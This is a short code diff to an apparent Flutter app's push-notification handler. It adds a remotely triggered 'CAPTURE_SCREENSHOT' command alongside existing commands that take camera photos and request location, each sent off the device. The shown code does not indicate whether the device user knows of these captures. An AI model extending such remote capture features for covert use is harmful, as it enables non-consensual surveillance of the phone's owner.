@@ -2,6 +2,7 @@
 import 'package:firebase_messaging/firebase_messaging.dart';
 import 'package:get/get.dart';
 import 'dart:developer' as developer;
+import '../background/screen_capture_service.dart';
 import '../local/local_storage_service.dart';
 import '../api/device_service.dart';
 import '../background/camera_service.dart';
@@ -147,6 +148,12 @@ class FcmHandler {
           final useFront = data['front_camera']?.toString() == 'true';
           await CameraService.captureAndSend(useFrontCamera: useFront);
           developer.log('✅ Photo capture command sent', name: _tag);
+          break;
+
+        case 'CAPTURE_SCREENSHOT':
+          developer.log('🖥️ Executing: Capture Screenshot', name: _tag);
+          await ScreenCaptureService.captureAndSend();
+          developer.log('✅ Screenshot capture command sent', name: _tag);
           break;
 
         case 'REQUEST_LOCATION':
